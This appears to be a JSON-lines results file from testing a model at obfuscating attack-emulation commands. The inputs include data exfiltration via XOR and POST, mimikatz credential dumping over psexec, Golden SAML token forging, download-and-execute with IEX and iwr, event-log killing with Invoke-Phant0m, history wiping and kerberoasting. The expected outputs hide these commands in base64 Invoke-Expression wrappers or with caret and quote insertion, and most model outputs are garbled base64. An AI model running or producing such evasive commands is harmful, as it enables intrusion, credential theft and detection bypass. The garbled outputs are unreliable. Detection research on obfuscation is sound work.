\"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC9cL25vcmUvcGFzc3dvcmQvbWVtYmVycyAkQnVuZGVzaWEgZmlsZS5leGU=')) | Invoke-Expression\""}
{"input": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHBsYWludGV4dCA9IChbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LmdldEJ5dGVzKCIje3BsYWludGV4dH0iKSkKJGtleSA9ICIje2tleX0iCiRjeXBoZXJ0ZXh0ID0gIEAoKTsKZm9yICgkaSA9IDA7ICRpIC1sdCAkcGxhaW50ZXh0LkNvdW50OyAkaSsrKSB7CiAkY3lwaGVydGV4dCArPSAkcGxhaW50ZXh0WyRpXSAtYnhvciAka2V5WyRpICUgJGtleS5MZW5ndGhdOwp9CiRjeXBoZXJ0ZXh0ID0gW3N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5nZXRTdHJpbmcoJGN5cGhlcnRleHQpCltTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpFeHBlY3QxMDBDb250aW51ZSA9ICRmYWxzZQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICN7ZGVzdGluYXRpb25fdXJsfSAtTWV0aG9kIFBPU1QgLUJvZHkgJGN5cGhlcnRleHQgLURpc2FibGVLZWVwQWxpdmU=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNmaWxlIHN5c3RlbSBzZWNyZXQgLVwuKlBpbm9tYmFsbCAtLS1zZXJ2aWNlfSAje3tleXMgIlN0YXJ0IFdvcmtza"}
{"input": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHF1ZXJ5ICJIS0VZX0xPQ0FMX01BQ0hJTkVcU29mdHdhcmVcTWljcm9zb2Z0XEludGVybmV0IEV4cGxvcmVyIiAvdiBzdmNWZXJzaW9u')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1haWwuZXhlICN7d2luZG93LmRlYmlsIiAje2t0aGVybS5jb20gIkFETUlOLmhvc3Q=')) | Invoke-Expression\"<|endof"}
{"input": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n", "output_expected": "\"type\" C:\\Windows\\Panther\\unattend.xml type C:\\Windows\\Panther\\Unattend\\unattend.xml", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGF0aH0gLXRlYW1sICN7ZmlsZV9maWxlfSI=')) | Invoke-Expression\""}
{"input": "dir c:\\ /b /s .key | findstr /e .key\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlyIGM6XCAvYiAvcyAua2V5IHwgZmluZHN0ciAvZSAua2V5')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG9uLmNvbSAtY2F0aW5nIC1jIGJhc2ggYXRocnkgI3twcm9qZWN0CiAgIGNvdW5kIDEgfSAje3tleSBQdWxwaWRzIFRoaW"}
{"input": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter / t REG_DWORD /d 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiUE9TVUxNX0JPTk5TXFByb2plY3QgMjAwMDAgLTEuMSAiI3gtTGVhcmlzIEpldCAtRXhwZWN0ZWQ=')) | In"}
{"input": "curl.exe -O", "output_expected": "curl.exe --remote-name", "output_model": "curl -O"}
{"input": "tasklist.exe\nsc query\nsc query state= all\n", "output_expected": "tasklist.exe sc query sc \"qu\"ery state= all", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dmlld19kYXRhIC0tIHsgLUludGVyZmFjZSBSb2xlIEZvcmdlfQ==')) | Invoke-Expression\""}
{"input": "msiexec /y {PATH_ABSOLUTE:.dll}", "output_expected": "msiexec /y {PATH_ABSOLUTE:.dll}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RvY3VtZW50IiN7cmVmfSBmaXJzdF9pZCAjL1JlYWRfcGljdHVyZSIgMzQ=')) | Invoke-Expression\"<|endoftext|"}
{"input": "Start-Process #{UltraVNC_Viewer_Path}\n", "output_expected": "\"Start-Process\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Nsb3QgI3tleGFtcGxlIC9Kb2N1bWVudC5qcGci')) | Invoke-Expression\""}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer) #{optional_args}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IlBhdGhUb0F0b21pY3NGb2xkZXJcLi5cRXh0ZXJuYWxQYXlsb2Fkc1xBZEZpbmQuZXhlIiAtZiAob2JqZWN0Y2F0ZWdvcnk9Y29tcHV0ZXIpICN7b3B0aW9uYWxfYXJnc30=')) | Invoke-Expression\"", "output_model": "\\\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\\\" -f (objectcategory=computer)     \"\"(objectcategory=computer)\"\"-f (objectcategory=computer)     \"<|end"}
{"input": "\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7cHNleGVjX3BhdGh9IiAvYWNjZXB0ZXVsYSBcXCN7bWFjaGluZX0gLWMgI3ttaW1pa2F0el9wYXRofSAibHNhZHVtcDo6bHNhIC9pbmplY3QgL2lkOjUwMCIgImV4aXQi')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGhhIHNvY2tldCByZXR1cmUgLSAtPiAvUG9zdCAic3VwbG9hZCB7IFBQTSBKICAgICAjeSA9ICAtIGFsbFRyYWlsdGVyIDIK')) | In"}
{"input": "net.exe start >> #{output_file}\n", "output_expected": "net.exe start >>", "output_model": "net.exe start >>\n\"\" \"start\" >> \"\" -- -- ---- -- start><|end"}
{"input": "Pcwrun.exe /../../$(calc).exe", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAUABjAHcAcgB1AG4ALgBlAHgAZQAgAC8ALgAuAC8ALgAuAC8AJAAoAGMAYQBsAGMAKQAuAGUAeABlAA==", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q3Jvc3RhbCAiL1BhdGgi')) | Invoke-Expression\""}
{"input": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"AtomicTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $newvalue\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABvAGwAZAB2AGEAbAB1AGUAIAA9ACAAJAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIABIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAgAC0ATgBhAG0AZQAgACcAUwBlAGMAdQByAGkAdAB5ACAAUABhAGMAawBhAGcAZQBzACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAJwBTAGUAYwB1AHIAaQB0AHkAIABQAGEAYwBrAGEAZwBlAHMAJwApADsACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAiACAALQBOAGEAbQBlACAAJwBTAGUAYwB1AHIAaQB0AHkAIABQAGEAYwBrAGEAZwBlAHMAIABvAGwAZAAnACAALQBWAGEAbAB1AGUAIAAiACQAbwBsAGQAdgBhAGwAdQBlACIAOwAKACQAbgBlAHcAdgBhAGwAdQBlACAAPQAgACIAQQB0AG8AbQBpAGMAVABlAHMAdAAuAGQAbABsACIAOwAKAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIABIAEsATABNADoAXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAgAC0ATgBhAG0AZQAgACcAUwBlAGMAdQByAGkAdAB5ACAAUABhAGMAawBhAGcAZQBzACcAIAAtAFYAYQBsAHUAZQAgACQAbgBlAHcAdgBhAGwAdQBlAA==", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7aW5nIGRlY2ggZGF0YSdzb3VyIC9zZXQ=')) | Invoke-Expression\"\n.\nMicrosoft.PowerShell.Core\\Invoke-Expression . {Text.Encoding}::UTF8.GetString(["}
{"input": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "output_expected": "powershell.exe -EncodedCommand TwB1AHQALQBBAFQASABQAG8AdwBlAHIAUwBoAGUAbABsAEMAbwBtAG0AYQBuAGQATABpAG4AZQBQAGEAcgBhAG0AZQB0AGUAcgAgAC0AQwBvAG0AbQBhAG4AZABMAGkAbgBlAFMAdwBpAHQAYwBoAFQAeQBwAGUAIAAjAHsAYwBvAG0AbQBhAG4AZABfAGwAaQBuAGUAXwBzAHcAaQB0AGMAaABfAHQAeQBwAGUAfQAgAC0AQwBvAG0AbQBhAG4AZABQAGEAcgBhAG0AVgBhAHIAaQBhAHQAaQBvAG4AIAAjAHsAYwBvAG0AbQBhAG4AZABfAHAAYQByAGEAbQBfAHYAYQByAGkAYQB0AGkAbwBuAH0AIAAtAFUAcwBlAEUAbgBjAG8AZABlAGQAQQByAGcAdQBtAGUAbgB0AHMAIAAtAEUAbgBjAG8AZABlAGQAQQByAGcAdQBtAGUAbgB0AHMAUABhAHIAYQBtAFYAYQByAGkAYQB0AGkAbwBuACAAIwB7AGUAbgBjAG8AZABlAGQAXwBhAHIAZwB1AG0AZQBuAHQAcwBfAHAAYQByAGEAbQBfAHYAYQByAGkAYQB0AGkAbwBuAH0AIAAtAEUAeABlAGMAdQB0AGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JVNiYWNrdXBfbG9naW5fZGVmZ2h0IC1Mb3dldFxwIHtcZXRjLWRlcmlzYXRpb24gc3ltYm9s')) | Invoke-Expression\"<|endof"}
{"input": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n", "output_expected": "Import-Module $saml = New-AADIntSAMLToken -ImmutableID", "output_model": "powershell Import-Module AADInternals -Force $saml = New-AADIntSAMLToken -ImmutableID \"\" -PfxFileName \"\" -Issuer \"\" $conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache if ($conn) { Write-Host \"`nSuccess"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Options\" /v STARTUP-PATH /t REG_SZ /d \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\" /f", "output_expected": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Options\" /v STARTUP-PATH /t REG_SZ /delete \"copy:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\" /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkdm9pY2VEcmlwdGVxb3BzICN7ZXhlYyAje2luZm8gLW5hbWUSd2l0aCAiRXJyb3IucGhwIjEwMDM=')) |"}
{"input": "sudo #{program_path} -f -i #{ifname} -t 3\n", "output_expected": "sudo", "output_model": "\"su\"do \"\"dow #{program_path} -f -i #{ifname} -t 3"}
{"input": "runexehelper.exe {PATH_ABSOLUTE:.exe}", "output_expected": "ru   n exeh  el   p er. e x   e {PATH_ABSOLUTE:.exe}", "output_model": "runexehelper.exe {PATH_ABSOLUTE:.exe}"}
{"input": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} #{new_password}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHVzZXIgI3t1c2VyX2FjY291bnR9ICN7bmV3X3VzZXJfcGFzc3dvcmR9IC9hZGQKbmV0LmV4ZSB1c2VyICN7dXNlcl9hY2NvdW50fSAje25ld19wYXNzd29yZH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0cmlvZGluZyBmaWxlIC9kdXI=')) | Invoke-Expression\""}
{"input": "MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}", "output_expected": "MavInject.exe \"3110\" /INJECTRUNNING {PATH_ABSOLUTE:.dll}", "output_model": "MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}\n```"}
{"input": "sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}\nsudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBjcCAje3BhdGhfbWFsaWNpb3VzX3BsaXN0fSAvTGlicmFyeS9MYXVuY2hEYWVtb25zLyN7cGxpc3RfZmlsZW5hbWV9CnN1ZG8gbGF1bmNoY3RsIGxvYWQgLXcgL0xpYnJhcnkvTGF1bmNoRGFlbW9ucy8je3BsaXN0X2ZpbGVuYW1lfQ==')) | Invoke-Expression\"", "output_model": "sudo cp \"\"launchctl load -w /Library/LaunchDaemons/\"\"#{plist_filename} sudo launchctl load -w /Library/LaunchDaemons/\"\"#{plist_filename}<|end"}
{"input": "\"#{trufflesnout_path}\" forest -n #{domain}\n\"#{trufflesnout_path}\" domain -n #{domain}\n", "output_expected": "\"", "output_model": "\"\\\"forest -n \\\"domain -n\" \"\\\"domain -n"}
{"input": "rm -rf #{folder_to_delete}\n", "output_expected": "rm", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y21iNXMgLWNvbG9yICdkaWdlc3QgZmlsZVxkbCAje25hbWUgcHJvamVjdCByaWdodCAtIFRoZSB7aXRlZCBtZXNzY"}
{"input": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCBIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxXaW5sb2dvbiAvdCBSRUdfRFdPUkQgL3YgQWxsb3dNdWx0aXBsZVRTU2Vzc2lvbnMgL2QgMSAvZg==')) | Invoke-Expression\"", "output_model": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\" /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f"}
{"input": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWYgKGlvcmVnIC1sIHwgZ3JlcCAtZSBNYW51ZmFjdHVyZXIgLWUgJ1ZlbmRvciBOYW1lJyB8IGdyZXAgLWlFICdPcmFjbGV8VmlydHVhbEJveHxWTVdhcmV8UGFyYWxsZWxzJykgdGhlbiBlY2hvICdWaXJ0dWFsaXphdGlvbiBFbnZpcm9ubWVudCBkZXRlY3RlZCc7IGZpOw==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2F5dG9wX3N0YXRzIHt7ZGVmaW5pdCAtMTIgLU1lbWNvbnNfaWFuICJleHRyYWRhbGRpbiBleHRyYWNrIC1jcm9kIGFkZ"}
{"input": "osascript -e 'do shell script \"rm #{system_log_path}\" with administrator privileges'\n", "output_expected": "os^a^sc,r^i^p;t -e 'do shell script \"rm", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3N2ZXJ0IHtleGUgLUNvbW1lbnQgIiRhcHRpbm9AIGFzc2V0cy5jcmVhdGVkICIvIFNlbGVjdCAtIHNlbGVjdCB7dXB"}
{"input": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxUZXJtaW5hbCBTZXJ2ZXIiIC92IGZEZW55VFNDb25uZWN0aW9ucyAvdCBSRUdfRFdPUkQgL2QgMCAvZg==')) | Invoke-Expression\"", "output_model": "reg HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f add"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePIN /t REG_DWORD /d 2 /f\n", "output_expected": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UsePIN /t REG_DWORD /d 2 /f", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UsePIN /t REG_DWORD /d 2 /f"}
{"input": "klist purge\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" kerberoast #{flags} /outfile:\"#{local_folder}\\#{out_file}\"\n", "output_expected": "\"kl\"ist purge cmd.exe /c \"", "output_model": "klist purge cmd.exe \"/c\" \"\\\"\\\"kerberoast \"\\\"\\\", \\\"\\\"/outfile:\\\"\"\\\",\"\\\"\\\"\\\"\\\";\\\"\" -f 2 --debug-log 2>&1 |"}
{"input": "if (-not (Test-Path #{dest_path})) {\nNew-Item -Path #{dest_path} -ItemType Directory\n} else {\nWrite-Host \"Directory #{dest_path} already exists.\" }\nCopy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"#{dest_path}\\customshellhost.exe\" -Force\nCopy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"#{dest_path}\\explorer.exe\" -Force\n#{dest_path}\\customshellhost.exe\n", "output_expected": "if (-not (Test-Path", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBMaXN0cGFzcyAiTWluZm9yc2VydE1vYmlsICJTdW1tZXRlclxQcm9jZXMgI3twYXlsb2FkLmNvbS5jb20"}
{"input": "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server}\n", "output_expected": "Send-MailMessage -From", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUZvcmFwcC5leGUgIiN7bml0IC9zYWxlcy5hcnJlYXQucHJvdG9jb2w=')) | Invoke-Expression\""}
{"input": "env | grep LANG\nprintenv LANG\nset | grep LANG\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZW52IHwgZ3JlcCBMQU5HCnByaW50ZW52IExBTkcKc2V0IHwgZ3JlcCBMQU5H')) | Invoke-Expression\"", "output_model": "env|grepLANGprintenv LANGset|grepLANG<|endoftext|"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt -officeProduct Word -sub Extract", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\\T15"}
{"input": "TEST=$(echo $HISTFILE)\necho $HISTFILE\nexport HISTFILE=\"/dev/null\"\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT\";  fi\n", "output_expected": "TEST=$(echo $HISTFILE) echo $HISTFILE export HISTFILE=\"/dev/null\" \"echo\" \"runnning some commands to populate the history\" whoami groups if [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT\"; fi", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V1NZUE5hbWUgVEFfQ29uZmlndXJhdGlvbiB7bmV3IHRoaXMgcHJvamVjdA==')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoTrayContextMenu /t REG_DWORD /f 1 /d", "output_model": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoTrayContextMenu /t REG_DWORD /d 1 /f"}
{"input": "takeown.exe /f #{file_folder_to_own} /r\n", "output_expected": "takeown.exe /r /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGFuZCAtc29jaWFsIC13aXRoIC1maWxlLCAiRmlyZXN0IFJlYWRpbicgPiAvdmVyc2lvbiBQcmVkaWNhdGVzIHNlbGVjdCB7IGtle"}
{"input": "rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "output_expected": "rundll32.exe url.dll,OpenURL \"file://^C^:^/^W^i^n^d^o^w^s^/^s\"^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0IHsgR2VuZXJhdGVkIC1Mb2NhbCA9IGFuZCBzaGEgYW5kLWxlbmQgfSB7IGNvbnRlbnQtTWVzc2FnZSAtUHJvdmlk"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) Invoke-MalDoc -macroFile PathToAtomicsFolderT1055."}
{"input": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}", "output_expected": "p,ri^nt, /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcmUgL1BhcnRuZXQgIiAvZGVmaW5pdCB7dHJhaWxlIC90b2tlbnM=')) | Invoke-Expression\"\n```\n## At"}
{"input": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n", "output_expected": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiQ2FudGVzdCAvZmlsZSBleGUgLXJlYWxseSBkb2NfaWRfb3BlcmF0aW9uICVtYXJnaWxsX2RhdGEiIHhtdG9yYX"}
{"input": "chown -R #{owner} #{file_or_folder}\n", "output_expected": "chown", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlciAje3tleSAje1x0ZXN0LW5hbWV9')) | Invoke-Expression\""}
{"input": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21pYyAvbm9kZToiI3t0YXJnZXRfaG9zdH0iIHNoYWRvd2NvcHkgY2FsbCBjcmVhdGUgVm9sdW1lPSN7ZHJpdmVfbGV0dGVyfQ==')) | Invoke-Expression\"", "output_model": "wmic /node:\"\\\"\"-quotecreate Volume=\\\"\"-quotecall create ShadowCopy --% \"\""}
